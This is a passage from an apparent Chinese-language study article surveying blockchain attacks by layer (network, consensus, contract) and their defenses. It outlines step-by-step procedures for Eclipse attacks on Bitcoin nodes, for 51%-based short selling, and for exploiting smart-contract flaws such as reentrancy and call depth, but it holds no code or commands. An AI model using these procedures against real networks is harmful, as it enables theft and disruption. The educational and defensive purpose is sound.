<p>​	在区块链网络中，用户创建新身份或新节点是不需要代价的，攻击者利用这一漏洞发动Sybil攻击，<strong>伪造自己的身份加入网络，在掌握了若干节点或节点身份之后，随意做出一些恶意的行为</strong>。例如降低区块链网络节点的查找效率；或者网络中传输非授权文件、破坏文件共享安全、消耗节点间的连接资源等。</p>
<hr>
<h5 id="关于Eclipse攻击"><a href="#关于Eclipse攻击" class="headerlink" title="关于Eclipse攻击"></a>关于Eclipse攻击</h5><p>Eclipse攻击是指攻击者通过侵占节点的路由表，<strong>将足够多的虚假节点添加到某些节点的邻居节点集合中</strong>，从而将这些节点“隔离”于正常区块链网络之外。</p>
<p>   当节点受到Eclipse攻击时，节点的大部分对外联系都会被恶意节点所控制，由此恶意节点得以进一步实施路由欺骗、存储污染、拒绝服务以及ID劫持等攻击行为。Eclipse攻击原理如图所示：</p>
<p><img src="https://s2.loli.net/2024/11/30/esoESXaZTVwzFAJ.png" alt="2.png"></p>
<p>Eclipse攻击者<strong>不断的向区块链节点发送路由表更新信息来影响区块链节点的路由表</strong>，使普通节点的路由表充满虚假节点。当区块链节点的路由表虚假节点占较高比例时，它对区块链网络的正常行为（如路由查找、资源搜索）都会被恶意节点所隔绝。</p>
<p>Eclipse攻击和Sybil攻击密切相关，它<strong>需要较多的Sybil攻击节点相配合</strong>。为了实现对特定区块链节点群的Eclipse攻击，攻击者需要先设置足够多的Sybil攻击节点，并向区块链网络宣称他们是“正常节点”，然后利用这些Sybil节点和正常的节点通信，入侵其路由表，最终把他们从区块链网络中隔离出去。</p>
<p>   Eclipse攻击<strong>破坏了区块链网络的拓扑结构，减少了节点数目，使区块链网络资源共享的效率大大降低</strong>，极端情况下，它可以控制整个网络，将其分割成若干个区块链网络区域。对受害节点来说，它在未知情况下脱离区块链网络，所有区块链网络请求消息都会被攻击者劫持。</p>
<hr>
<h4 id="合约层攻击"><a href="#合约层攻击" class="headerlink" title="合约层攻击"></a>合约层攻击</h4><p>合约层是区块链实现点对点可信交互的重要保障，主要包括智能合约的各类脚本代码、算法机制等，是区块链2.0的重要标志。<strong>合约层面临的安全威胁可以分为智能合约漏洞和合约虚拟机（EVM）漏洞</strong>：智能合约漏洞通常是由开发者的不规范编程或攻击者恶意漏洞植入导致的，而合约虚拟机漏洞则是由不合理的代码应用和设计导致的。</p>
<p>首先是智能合约编程导致的漏洞，这类漏洞通常是由于开发者在编写智能合约时的不规范编程或者疏忽导致的；其次是合约虚拟机漏洞，合约虚拟机（Ethereum Virtual Machine，EVM）是以太坊上智能合约运行的环境，如果EVM存在漏洞，那么所有运行在该环境上的智能合约都可能受到影响。</p>
<p>类型：重入攻击（reentrancy attack）或者前置运行攻击（front-running attack）用于破坏合约的正常执行或者盗取资产；DAO攻击就是利用当时以太坊智能合约和EVM中的递归调用漏洞来实现的。</p>
<h4 id="应用层威胁"><a href="#应用层威胁" class="headerlink" title="应用层威胁"></a>应用层威胁</h4><p>应用层是区块链技术的应用载体，为各种业务场景提供解决方案，可分为记账和区块链交易两类场景。（<strong>应用层是用户与区块链系统交互的层面，包括智能合约和去中心化应用</strong>（Decentralized Applications，DApps）。智能合约的代码如果有漏洞，就可能成为攻击的目标）</p>
<p>   在记账场景中，攻击者可能通过漏洞植入、网络渗透、地址篡改等方式攻击记账系统，从而非法获利；“聪明”的记账系统也可能利用记账机制的漏洞，通过算力伪造攻击、扣块攻击、丢弃攻击等方式谋求最大化的收益。</p>
<p>​    在区块链交易场景中，攻击者可能利用撞库攻击、0day漏洞、API接口攻击等方式非法获取交易平台中用户的隐私信息，也可能通过钓鱼攻击、木马劫持攻击等方式获取用户账户的隐私和资产。</p>
<p>类型：智能合约漏洞利用是一种常见的应用层攻击，攻击者通过调用存在缺陷的智能合约来盗取资产或破坏应用逻辑。</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>   在实际的区块链攻击场景中，攻击者发起攻击旨在非法获取最大化的利益，但并不是所有的区块链攻击方式都可以使攻击者直接获利。此外，部分区块链攻击对实施场景和条件要求过高，使得其可行性受到了严重的制约。因此，攻击者通常采用一系列跨层级的区块链攻击方式来实现最大化的获利目的，这种攻击序列为攻击簇。</p>
<p>   例如：现实场景中，攻击者利用自身资源发起51%攻击是不现实的，所以他们可能通过傀儡记账、贿赂攻击、币龄累计攻击等方式非法获取记账权竞争资源，然后发起51%攻击，进而实现双花攻击、历史修复攻击、卖空攻击等。显然，研究区块链安全态势，不仅要从层级分类的横向维度对单个攻击展开分析，还要从攻击关联分析的纵向维度对跨层级的攻击簇进行研究，才有可能构建出全面有效的区块链安全防御体系。</p>
<h2 id="攻击类型分析"><a href="#攻击类型分析" class="headerlink" title="攻击类型分析"></a>攻击类型分析</h2><h3 id="网络层攻击类型分析"><a href="#网络层攻击类型分析" class="headerlink" title="网络层攻击类型分析"></a>网络层攻击类型分析</h3><p>   网络层是区块链技术体系中最基础的技术架构，封装了区块链系统的组网方式、消息传播协议和数据验证机制等要素，使区块链具备了去中心化、不可篡改的技术特性。</p>
<p>   区块链网络是由P2P网络构建，P2P网络主要涉及用户客户端和对等网络结构，P2P网络的攻击可能针对这两个方面展开如下攻击：</p>
<p>（1）客户端漏洞（client vulnerability）： 尽管现有全节点客户端的底层协议互相兼容，增强了比特币网络的健壮性，但客户端代码中可能存在诸多安全漏洞，并且这些漏洞会随着客户端类型的增加而增加 。攻击者可以利用0day漏洞扫描等技术扫描客户端中存在的漏洞，然后利用这些漏洞发起各种攻击。2018年，区块链安全公司Peck Shield披露了一个安全漏洞，攻击者可以向以太坊客户端发送特定恶意报文，导致2&#x2F;3的以太坊节点下线。</p>
<p>（2）窃听攻击（eavesdropping attack）：攻击者可以通过网络窃听，获取区块链用户节点的网络标识，并将其与IP地址关联起来，进而获取用户节点的隐私信息，甚至可以追溯到用户的实际家庭地址。以比特币为例，用户通过连接一组服务器来加入比特币网络，这个初始连接集合就是该用户的唯一入口节点。攻击者可以通过与比特币服务器建立多个连接，以窃听客户端与服务器端的初始连接，获得客户端的IP地址。随着交易流经网络，攻击者将窃听得到的IP地址与已有的客户端入口节点进行匹配，若成功，则攻击者便可获知交易的来源。</p>
<p>（3）日蚀攻击（eclipse attack）：攻击者通过特定手段使得目标节点只能获得被操纵的、伪造的网络视图，将其从实际的网络视图中隔离出来，从而妨碍目标节点正常运转，以达成特定的攻击目的。攻击者操纵多个对等节点与目标节点保持长时间的传输连接，使其在线链接数达到目标节点的入站连接上限，从而阻止其他合法节点的连接请求。此时，目标节点被攻击者从P2P网络中“隔离”出来，导致目标节点无法正常维护区块链账本。</p>
<p> <strong>日蚀攻击的实施方法如下</strong>：</p>
<ul>
<li><p>攻击者可以通过某种方法把正常的比特币节点的输出连接都连接到攻击者控制的恶意节点，同时比特币节点的输入连接都被恶意节点连满。那如何做到让正常的比特币节点都连接到恶意的节点呢？在比特币节点中有两张表，一张叫作NewTable，用来保持当前节点所感知到的网络中其他节点的地址；另一张叫作TriedTable，用于保存曾经连接过的节点。 比特币节点每次建立输出连接的，都是在这两张表中选择一个时间戳较新的节点连接。通过控制僵尸网络不断地去连接这个比特币节点，即可达到刷新这两张表的目的，使得这两张表保存了大量的恶意节点的地址信息。</p>
</li>
<li><p>攻击者再通过DDoS攻击等方法，让这个比特币节点重启。这样这个比特币节点连到的就都是攻击者控制的恶意节点了。</p>
</li>
<li><p>边界网关协议（border gateway protocol，简称BGP）劫持攻击：BGP是因特网的关键组成部分，攻击者可以通过劫持BGP来实现操纵互联网路由路径的目的。由于区块链是基于互联网来传递信息的，劫持BGP可以实现对区块链节点流量的误导和拦截。攻击者一旦接管了节点的流量，就可以通过影响区块链网络的正常运行来破坏共识和交易进程。例如，比特币系统的大部分节点都被托管至几个特定的互联网服务提供商，大约60%的比特币连接都会通过这些特定服务商，所以攻击者一旦接管了这部分流量，将可以通过BGP路由劫持破坏区块链网络的完整性，甚至导致区块链网络瘫痪。</p>
</li>
<li><p>分割攻击（segmentation attack）：攻击者通过BGP劫持攻击将区块链网络划分成两个或多个不相交的网络，此时的区块链会分叉为两条或多条并行支链。攻击者可以在多个支链网络中将同一笔电子货币兑换成现实商品或法币。BGP劫持攻击停止后，区块链重新统一，以最长的链为主链，其他的链上的交易、奖励等全部失效，攻击者由此获利。</p>
</li>
<li><p>DoS攻击（denial-of-service attack）：即拒绝服务攻击，攻击者利用大量网络资源攻击计算机系统或网络，使其停止响应甚至崩溃，从而拒绝服务。实际中，用户节点资源通常受限，攻击者只能通过分布式DoS攻击（distributed denial-of-service，简称DDoS）整合零散网络带宽来实施DoS攻击。2017年5月，Poloniex交易平台遭受了严重的DDoS攻击，导致比特币价格被锁定在1761美元，用户无法正常执行交易。此外，当区块链网络中的大部分矿工无法盈利时，可能通过拒绝为区块链网络服务而发起BDoS攻击（blockchain denial of service，简称BDoS），导致区块链网络瘫痪。</p>
</li>
<li><p>交易延迟攻击（transaction delay attack）：比特币闪电网络（lightning network）通常使用哈希时间锁定技术来实现安全的资产原子交换，其安全性主要依赖于时间锁定和资金锁定。由于每一笔资金交换都需要通过时间锁定来规定该交易必须在某个时间段内完成。一些恶意节点短时间内建立大量交易，然后故意超时发送，致使网络发生阻塞，影响正常运作。</p>
<p> 网络层攻击的主要攻击目标是区块链底层的P2P网络，其共性在于攻击者都是通过扰乱用户的之间的通信，从而达到不同的攻击目的。根据攻击方式的特性，区块链网络层攻击大致可以分为信息窃取类攻击、网络路由劫持类攻击和恶意资源占用类攻击。</p>
</li>
</ul>
<p>（1）信息窃取类攻击：主要包括客户端代码漏洞和窃听攻击。在针对客户端代码漏洞的攻击场景中，攻击者利用的漏洞可能是预先恶意植入的后门，也可能是开发人员编写错误导致的。理论上，无法完全杜绝类似的漏洞，所以开发商应在软件安全开发生命周期内，通过Fuzzing、代码审计、逆向漏洞分析、反逆向工程等技术对客户端的安全性进行评估，以缓解类似漏洞带给用户的安全威胁。</p>
<p>  在窃听攻击场景中，攻击者可以通过网络监听等手段获取用户身份、地址等隐私信息，其关键在于用户的区块链网络标识唯一，攻击者可以将窃听得到的IP地址与已有的客户端入口节点进行匹配，从而获得交易数据来源和用户隐私。为了预防窃听攻击，用户应采用混淆的交易方法来打破交易过程中用户唯一标识与IP地址之间的一一对应关系。具体地，多个用户可以通过共享唯一网络标识，实现“一对多”或“多对一”的交易，以此混淆用户唯一标识与IP地址之间的一一对应关系，使得攻击者无法通过匹配用户标识和IP地址来获取用户隐私。此外，在交易数据的传输过程中，应使用可靠的加密算法实现数据的加密传输，防止恶意攻击者对网络节点的信息进行窃取。</p>
<p>（2）网络路由劫持类攻击：主要包括日蚀攻击、BGP劫持攻击和分割攻击，它们的攻击原理相似，攻击目标分别为单个节点、节点集合和P2P网络。攻击者通过改变节点的网络视图，将目标节点集合从区块链网络中隔离出来，从而达成控制区块链网络的目的。以比特币系统为例，攻击者可以通过这3种攻击迫使部分矿工节点“离线”，导致区块链全网实际算力的流失，从而使攻击者的算力在全网总算力中的占比不断上升。当算力超过全网算力的一半时，攻击者可以以远低于原全网51%的算力发动51%攻击。与通过提升自身算力来实施51%攻击的方式相比，通过日蚀攻击和BGP劫持攻击来提升自身攻击优势的方式更加经济。攻击者之所以可以发起日蚀攻击，其关键在于目标节点无法判断已连接节点的身份。为了预防日蚀攻击，Letz等人提出了共识信誉机制BlockQuick。BlockQuick中的网络节点在接受新产生的区块时，会对矿工的加密签名进行验证，并将该矿工的身份与共识信誉表中已知矿工的身份进行比对。最终，当共识得分大于50%时，网络节点才会接受该区块；否则，节点察觉出攻击者的日蚀攻击行为并拒绝该区块。而在BGP劫持攻击和分割攻击场景中，攻击者主要通过BGP路由劫持实现网络视图分割。针对这个问题，研究人员提出了自动实时检测与缓解系统（ARTEMIS），可以在几分钟内帮助服务提供商解决BGP劫持问题，使得实时流的公共BGP监控服务成为可能。</p>
<p>（3）恶意资源占用类攻击：DoS，DDoS攻击属于通过恶意资源占用实现的拒绝服务攻击，目前已经存在很多有效的防御工具，如DoS防火墙等。而BDoS和交易延迟攻击则属于社会工程学类攻击，解决此类攻击只能通过不断完善激励制度和奖惩制度、优化网络环境等社会工程学手段。</p>
<h3 id="共识层攻击类型分析与防御"><a href="#共识层攻击类型分析与防御" class="headerlink" title="共识层攻击类型分析与防御"></a>共识层攻击类型分析与防御</h3><p>   针对非授权共识机制的攻击。 非授权共识机制是指在非授权网络（公有链）中，节点无需身份认证，即可加入网络与其他节点为达成某种共识而共同运行的特定共识算法。经典非授权共识算法包括工作量证明机制（proof of work，简称PoW）、权益证明机制（proof of stake，简称PoS）、信誉证明机制（proof of reputation，简称PoR）及其衍生算法。委托权益证明机制（delegated proof of stake，简称DPoS）、评价证明机制（proof of review，简称PoR）、PoR&#x2F;PoS混合共识机制（PoR&#x2F;PoS-hybrid）等。授权共识算法中，各节点达成共识消耗的是等价的参与权，即节点共识权重相等。而在非授权共识机制中，各节点通过消耗自身持有的“筹码”（PoW中代表算力Work，PoS中代表权益Stake）竞争记账权，进而达成共识，即节点共识权重不相等。 非授权共识机制可以在本轮竞争“总筹码”为N&#x3D;2n+1、恶意节点持有“筹码”不超过n的情况下，确保全网节点达成正确共识（容错率为1&#x2F;2）。</p>
<p>   恶意筹码获取。在非授权的共识机制中，节点持有的“筹码”越多，则其获得记账权的可能性越大。所以节点可能通过傀儡挖矿、贿赂攻击、币龄累计攻击等方式获取“筹码”，以提高自己获得记账权的成功率。</p>
<p> （1）傀儡挖矿攻击（puppet attack）：攻击者通过植入木马入侵大量网络节点，部署挖矿程序，盗用被入侵主机的电力、算力等资源挖矿获利。2018年初，上百款《荒野行动》游戏辅助被植入挖矿木马，利用游戏主机显卡的高性能来挖矿获利。同年，攻击者在大量网站的首页植入Coinhive平台的门罗币（Monero）的挖矿代码，通过网页端盗用网络节点资源挖矿获利，导致该网站用户的系统运行变慢。</p>
<p> （2）币龄累计攻击（coin age accumulation attack）：在基于“POW+POS”混合共识机制的区块链中，节点持有的“筹码”不仅与其算力有关，还与其持有的币龄有关。持币量越多、持币时间越长，则节点持有的币龄越多。因此，节点可以通过币龄累计攻击来获取更多的“筹码”。买入一定数量代币后，持有足够长时间后，就可以获得足够多的币龄用于竞争记账权。</p>
<p> （3）贿赂攻击（the bribing attack）:攻击者通过“恶意悬赏”，鼓励矿工在攻击者指定的支链上进行挖矿，当支链挖矿投入的“筹码”超过全网总筹码的一半时，攻击者便通过51%攻击实现双花攻击、历史修复攻击、卖空攻击等。在PoW中，贿赂攻击可以看作是一种算力租借方式，被贿赂矿工需要消耗大量算力来挖矿，因此攻击者的攻击成本较高；而在PoS共识机制中，被贿赂节点不需要消耗大量算力，以较低成本便可赚取攻击者的悬赏，因此贿赂攻击所需的成本较低，常见于PoS系统。</p>
<p>   除了通过增加“筹码”提高筹码占比的方法以外，攻击者还可能通过网络层日蚀攻击、BGP路由劫持、分割攻击等手段迫使大量节点离线，使区块链网络的总算力流失，从而提高自己的记账权竞争筹码占比和记账权竞争的成功率。</p>
<p>   51%攻击。一旦存在恶意节点持有的“筹码”超过本轮记账权竞争总“筹码”的一半，则其可以以较大的优势获得记账权，并主导区块链达成特定共识，该攻击被称为短程51%攻击 ；也可以利用资源优势计算并生成一条区块链支链，使其长度超过当前主链，并代替成为新的主链，这种攻击被称为长程51%攻击。</p>
<p>   在实际的区块链网络中，攻击者可能将51%攻击作为一种子攻击，进而实现以下几类攻击。</p>
<p> （1）双花攻击（double spending attack）:以比特币系统为例，攻击者在完成交易A后，针对A花费的代币伪造交易B，并发动长程51%攻击，将一条包含交易B的支链变成新的主链。如此，攻击者对相同的一组代币实现了“双重花费” 。2016年8月，基于以太坊的数字货币Krypton遭受了名为“51%Crew”的51%攻击，攻击者通过租用Nicehash（算力买卖市场）的算力，导致该区块链损失约21465KR的代币。2018年，比特币黄金社区的一位成员发文称：有人在尝试进行针对交易所的双花攻击，这一攻击造成了千万美元的损失，同时引起了人们对于去中心化和PoW机制的质疑。</p>
<p> （2）历史修复攻击（history-revision attack）：在区块链网络中，当攻击者无法持续拥有超过竞争本轮记账权总筹码的一半以上筹码时，攻击者和诚实节点的身份可能发生颠倒，并导致多轮51%攻击。 具体地，当攻击者A成功发起51%攻击将他的支链变为主链时，之前的主链变为支链，诚实节点B变为“恶意节点”，A成为“诚实节点”。一旦B获得超过新一轮记账权总筹码的一半时，便可作为“攻击者”发起51%攻击，将他们的“支链”恢复为主链，此时称B发起了历史修复攻击。</p>
<p> （3）卖空攻击（shot selling attack）：51%攻击会破坏区块链系统，导致其对应的代币贬值。尤其是在PoS共识机制下，“聪明”的矿工一般不会对基于PoS的区块链系统发动51%攻击。因为攻击者成功发起51%攻击，意味着其持有大量代币，而代币贬值将会给攻击者带来巨大的经济损失。但在支持证券信用交易的PoS系统中，攻击者可能通过51%攻击发起卖空攻击来牟取暴利，具体步骤如下：</p>
<p>①攻击者持有数量为A的代币，这些代币的权益需超过本轮投票总权益的一半以上。</p>
<p>②攻击者通过证券信用交易或金融借贷等手段获得数量为B的代币，B的数量远大于A。这里的B是攻击者所借的证券，攻击结束后，需返还等额的代币给借贷方，如交易所。</p>
<p>③攻击者将所借的代币套现，兑换为具备实际价值的经济实体或货币。</p>
<p>④攻击者使用双花攻击、传统网络攻击等手段恶意影响区块链网络的正常运作，从而使得基于该区块链的数字货币贬值，此处将贬值率记为Δ。攻击者回购数量为B的代币偿还给借款方，最终获利Δ（B-A）。</p>
<p> （4）自私挖矿攻击（selfish mining attack）：与双花攻击不同，自私挖矿攻击是一种利用短程51%攻击持续性获取记账权，进而赚取奖励的攻击方式，常见于PoW系统中。攻击者通过短程51%攻击，以较大优势比其他节点先挖到“矿”，暂扣区块并赶在其他节点之前公布出来，以获取记账权并赚取奖励。在延迟公布期间，攻击者沿着之前的区块继续挖矿，以积攒更多的优势，保证他可以连续获得奖励 。这种攻击不会破坏比特币的运行机制，但会使其他节点的工作量无效化，浪费了大量的算力。</p>
<h4 id="其他攻击分析如下："><a href="#其他攻击分析如下：" class="headerlink" title="其他攻击分析如下："></a>其他攻击分析如下：</h4><p>（1）无利害关系攻击（nothing at stake attack）：这是一种针对PoS共识机制的攻击方式，攻击者可以在区块链产生分叉时，使用权益同时为多个分叉出块，以获取最大化的收益。由于攻击者无需像在PoW系统中消耗大量算力，只需进行权益投票便可实现利益最大化，因此也被称为“作恶无成本，好处无限多”的无利害关系问题，这变相地鼓励了区块链分叉的产生。“聪明”的矿工往往采取“在每条分叉上同时挖矿”的最佳策略以获取最大收益，这将导致区块链产生过多分叉，不再是唯一链。全网节点也因此无法达成共识，进而引起双花攻击、非法交易的泛滥。</p>
<p>（2）预计算攻击（pre-computation attack）：在“PoW+PoS”混合共识机制中，当前区块难度取决于前一区块参数（如哈希值）。攻击者可以在生成区块时，通过随机试错法计算并选择一个对自己产生下一区块最有利的参数。通过这种方式，攻击者有更大的优势可以获得下一区块的奖励。</p>
<p> （3）长距离攻击（long range attack）：PoS系统中，区块的生成速度比PoW快很多，所以攻击者可能尝试通过重写区块链账本，从而实现代币双花等目的。这种攻击和PoW中的长程51%攻击的原理相似 ，区别在于长距离攻击中，攻击者不用消耗大量算力，便可能伪造出一条新的区块链主链 ，攻击成本更低，所以带来的安全威胁更大。</p>
<p>   <strong>共识层攻击的主要攻击目标是影响区块链的共识进程</strong> ，其<strong>共性在于攻击者都是利用共识机制的特点或缺陷来提高自身竞争记账权的成功率，从而使区块链沿着对攻击者有利的方向发展</strong> ，以实现妨碍网络正常运行、货币双花、最大获利等实际目的。其特性则在于各个攻击的场景、目的、方式的不同。<strong>授权共识机制中，攻击者持有的有效节点身份数量是影响共识进程的关键。而在非授权共识机制中，算力、权益等类型的资源才是影响共识进程的关键。</strong> 同时，攻击者为了获取更多资源，可能采用诸多恶意的筹码获取手段来提升自己竞争记账权的成功率。此外，在一些特殊的系统中，攻击者无需积累“资源”便可实现最大化收益。</p>
<p>   在授权共识机制中，攻击者需持有超过全网1&#x2F;3的节点才有可能主导区块链网络达成有利于自己的共识即攻击者操纵了多个节点身份，发起了女巫攻击。在女巫攻击的场景中，攻击者可能通过伪造等手段获取多个节点身份，也可能通过胁迫、腐化等手段控制多个节点，而其他节点无法检测、判断出攻击者持有节点身份的数量及其之间的内部关系。因此，阻止女巫攻击的关键在于阻止攻击者获取多重身份，可以考虑以下策略。</p>
<p> （1）采用节点身份验证机制，通过身份验证防止攻击者伪造节点身份。目前，部分私有链采用了PoA共识机制，如Aura、Clique等，该机制通过随机密钥分发与基于公钥体制的认证方式，使得攻击者无法在区块链网络中伪造多个身份，在一定程度上缓解了女巫攻击。</p>
<p> （2）<strong>采用高成本的多身份申请机制，通过提高身份伪造成本缓解女巫攻击。</strong> 尽管节点身份验证机制可以阻止攻击者伪造身份，但在实际中，这种方式无法满足诚实节点对多节点身份的正常需求。因此，可以考虑在区块链中引入首次申请身份免费、多次申请成本指数式升高的身份申请机制，在满足节点对多身份正常需求的同时，指数式增加攻击者的攻击成本，缓解女巫攻击带来的安全威胁。</p>
<p> 理论上，女巫攻击也可以出现在非授权的共识场景中，但由于非授权共识算法中的节点是通过自身持有的“筹码”竞争记账权，多重身份伪造意味着攻击者“筹码”的分流，但“筹码”总量不会发生变化，而攻击者实施女巫攻击不但不能提高自己获得记账权的成功率，反而有可能导致其成功率降低，所以女巫攻击不会对非授权共识机制的共识过程产生实质性影响。</p>
<p>   克隆攻击是一种专门针对PoA系统的攻击方式，攻击者成功实施克隆攻击的关键，一方面在于PoA系统中记账节点集合恒定不变的固有缺陷，另一方面在于攻击者是否能通过BGP劫持攻击、分割攻击成功实现网络分区。因此，解决克隆攻击的关键在于如何阻止攻击者成功实施BGP劫持攻击、分割攻击，所以可以考虑采用ARTEMIS系统预防攻击者进行网络分区，从源头阻止克隆攻击。然而，ARTEMIS系统只能在网络发生异常时发现区块链网络是否发生分区，如果攻击者仅对部分关键数据进行管控而不影响其他数据的正常传递，则ARTEMIS也无法阻止此类“无特征”的克隆攻击。此时，准备出块的区块链节点可以考虑引入基于权重的节点活性检测方法，主动检测区块链网络是否发生网络分区。具体地，区块链节点可以通过随机取样的方式选取区块链中已有的区块，根据其中包含的交易类型、金额、数量等特征计算出该区块生成者的权重。然后随机选择节点并请求包含其心跳信息和上一区块哈希值在内的活性证明，如果该节点成功证明自身活性，则验证者累计已验证节点的权重，并重复上述操作直至累计权重达到预先设置的阈值；若被选中节点未通过或未参与活性检测，则证明区块链网络发生分区，应立即停止出块。尽管该方法与ARTEMIS无法从根本上阻止攻击者在PoA系统中实施克隆攻击，但能够在一定程度上预防并缓解克隆攻击来的危害，避免损失。</p>
<p>   在非授权共识机制中，攻击者在本轮“记账权”竞争中需持有超过全网1&#x2F;2的“筹码”，才有可能通过51%攻击主导区块链网络达成有利于自己的共识，进而实现双花攻击、历史修复攻击、卖空攻击等目的。而实际中，攻击者通常很难自己拥有足够的“筹码”来实施51%攻击，所以可能会通过各种手段获取“筹码”。为了预防51%攻击区块链网络应该采取如下策略，阻止攻击者通过傀儡挖矿攻击、贿赂攻击等方法获取“筹码”。</p>
<p>（1）加强区块链客户端的入侵检测能力，添加防火墙，阻止攻击者通过木马病毒入侵网络节点，盗用受害节点的挖矿资源。</p>
<p>（2）采用针对“恶意悬赏”的惩罚机制，缓解贿赂攻击带来的危害。全网节点可以对抵制恶意悬赏、恶意攻击达成共识，缴纳保证金并签订智能合约。一旦出现恶意悬赏，则对举报者进行奖励，对恶意节点进行惩罚，没收悬赏金额和保证金，限制其网络交易权限。</p>
<p> （3）在PoS中采用新型的币龄计算方法，限制节点恶意累计币龄的行为。如：点点币通过在币龄计算方法中设置节点持币时间上限的方式，限制了用户所持币龄的上限，在一定程度上阻止了51%攻击。</p>
<p> （4）在PoS中采用币龄预警、清零机制，预防51%攻击。在记账权竞争过程中，对节点进行身份认证和权益关联。若发现单节点或关联节点所持权益超过全网一半，则启动预警机制，阻止共识进程，然后清空恶意节点持有的全部币龄，并处罚金。</p>
<p>   尽管如此，攻击者还可能存在其他获取“筹码”的途径。为了进一步阻止51%攻击，以太坊提出了一种计划内置于PoS系统客户端的Casper机制。Casper机制要求以太坊的矿工锁定一些以太币作为押金，为刚产生的区块担保。如果投注者是诚实的，他们将获得相应的交易费用作为奖励；否则，Casper将没收大量已投注的以太币作为惩罚。显然，类似Casper机制的保证金奖惩机制可以很好地解决一些社会工程学问题，从而预防趋利节点发起的各种攻击。如：在无利害关系攻击场景中，Casper机制可以惩罚大部分恶意行为，提升了制造恶意分叉的代价使无利害关系攻击无法为攻击者带来收益。若矿工想参与挖矿，则他必须抵押一定数量的以太币作为押金，保证自己在最长链上挖矿。若该区块被确认上链，则矿工收回保证金并获得一定的奖励。如果其他矿工尝试在多条支链上挖矿来进行无利害关系攻击，则会被没收其在多条支链上的押金，这种概念叫做剑手（slasher）协议，即如果矿工在同一个层级的分叉上同时签署了两份承诺，该矿工就会失去区块奖励，甚至被没收押金。</p>
<p>   在预计算攻击场景中，攻击者可以通过预计算确定下一区块计算难度的关键在于区块生成算法中，上一区块哈希值与下一区块计算难度的关联性 。所以为了预防PoS系统中的预计算攻击，应该重新制定区块生成算法首先，可以考虑打断当前区块链计算难度与前一区块哈希值之间的联系，使得攻击者无法通过预计算控制后续区块的计算难度；其次，也可以考虑增加新的计算元素，使得上一区块的哈希值不再是确定下一区块计算难度的唯一因素。在长距离攻击场景中，区块链网络无法阻止攻击者伪造一条新的区块链主链，但可以通过类似BlockQuick的方式，通过增加身份认证、信誉值对比的方式限制全网节点对该链的接受度来预防长距离攻击。</p>
<h3 id="合约层攻击类型分析与防御"><a href="#合约层攻击类型分析与防御" class="headerlink" title="合约层攻击类型分析与防御"></a>合约层攻击类型分析与防御</h3><p>   合约层是区块链2.0技术体系的重要标志，封装了区块链的各类脚本代码、算法机制和智能合约，使区块链技术具备了较高的可编程性和实用性。图灵完备的区块链网络允许用户在区块链网络上开发并部署特定的代码或应用，但智能合约在编写过程中存在的诸多不足，可能给区块链网络带来以下安全隐患。</p>
<p>（1）整数溢出漏洞（integer overflow and underflow vulnerability）： 智能合约代码中，整数型变量都存在上限或下限，当变量存储的数值超过上限则称为整数上溢，超过下限则称为整数下溢。当一个整数变量发生溢出时，可能会从一个很大的数变成很小的数或者从一个很小的数变成很大的数。利用这个漏洞，攻击者通常通过输入异常参数致使整数溢出，从而达到修改地址指针，实现代码异常调用的目的。2010年8月，由于验证机制中存在大整数溢出漏洞，比特币的第74638块出现了一条包含超过1844亿个比特币的交易。2018年4月，BeautyChain（BEC）智能合约中出现了一个灾难性的整数溢出漏洞，导致约10亿美元的损失。</p>
<p>（2）时间戳依赖攻击（time-stamp dependency attack）： 智能合约的执行大多依赖于当前区块的时间戳，不同的时间戳可能导致智能合约产生不同的执行结果。以抽奖合约为例:假设智能合约需要根据当前时间戳和其他可提前获知变量计算出一个“幸运数”，以确定获奖人员。攻击者则可以在挖矿过程中提前尝试使用不同的时间戳来计算“幸运数”，从而将奖品送给自己想给的获奖者。</p>
<p>（3）调用深度攻击（call deep attack）： 合约虚拟机在运行过程中会为合约相互调用的深度设置一个阈值，即使合约调用不存在任何逻辑问题，但当调用深度超过该阈值后，合约将不再往下执行，即合约调用失败 。例如在以太坊虚拟机中，调用深度被限制为1024。如果攻击者发起一系列递归调用让栈的深度到达了1023，之后再调用目标智能合约的关键函数，就会自动导致这个函数所有的子调用失败。因此，攻击者可以通过控制调用深度，使得某些关键操作无法执行 。例如在区块链上实现一个拍卖的智能合约，由于拍卖过程中可能存在多次竞价，需要反复调用合约中的出价函数，攻击者可以恶意刷出价次数。当调用深度达到1023次临界值时竞拍结束，此时调用转账函数就会失败，导致拍卖失败。</p>
<p>（4）误操作异常攻击（misoperation attack）： 攻击者通过智能合约A调用智能合约B时，B可能因为执行异常而返回合约未执行的状态，若A不检查B的结果而继续执行，则将导致A在B未执行的情况下完成调用。 以KoET智能合约为例:网络中各节点可以通过智能合约买卖“以太币国王”称号来获利，支付金额由现任国王来决定。当一个节点想购买“国王”称号时，智能合约A调用智能合约B支付赔偿金给现任国王，并指定该节点成为新的国王。如果B因为操作异常（如调用深度攻击）导致支付失败，而A在未检查B执行结果的情况下继续执行，将导致节点在未支付赔偿金的情况下成为新的“国王”，原“国王”同时失去国王称号和赔偿金。</p>
<p>（5）重入攻击（re-entrancy attacks）： 攻击者针对智能合约代码的重入漏洞发起的攻击，可导致两个智能合约发生循环调用。其中最具代表性的是DAO攻击：攻击者通过智能合约A向智能合约B发起提现请求，B向A转账并调用A的回调函数。此时，若A的回调函数中被攻击者写入操作“合约A向合约B发起提现请求”。 如此，A再次向B发起提现请求并重复提现过程，直至提现失败（账户余额不足）。2016年6月发生了一起史上最严重的智能合约安全事件——“The DAO”，导致价值6000万美元的以太币被盗，迫使以太币硬分叉为以太坊ETH和以太经典ETC。</p>
<p>   针对合约虚拟机的攻击。合约虚拟机是智能合约的调用、执行平台，是区块链技术支持多样化应用的载体，提高了区块链的可扩展性，但仍然可能存在一些安全隐患。</p>
<p>（1）逃逸漏洞（escape vulnerability）： 攻击者在控制一个虚拟机的前提下，通过利用虚拟机和底层监控器（virtual machine monitor，简称VMM）的交互漏洞，实现对底层VMM或其他虚拟机的控制。虚拟机逃逸后可以在VMM层或者管理域中安装后门、执行拒绝服务攻击、窃取其他用户数据，甚至控制其他用户虚拟机等。在区块链系统中，虚拟机在运行代码时会提供一个沙盒环境，一般用户只能在沙盒的限制中执行相应的代码，此类型漏洞会使得攻击者编写的恶意代码在运行该沙盒环境的宿主机上执行，破坏宿主机与沙盒的隔离性。</p>
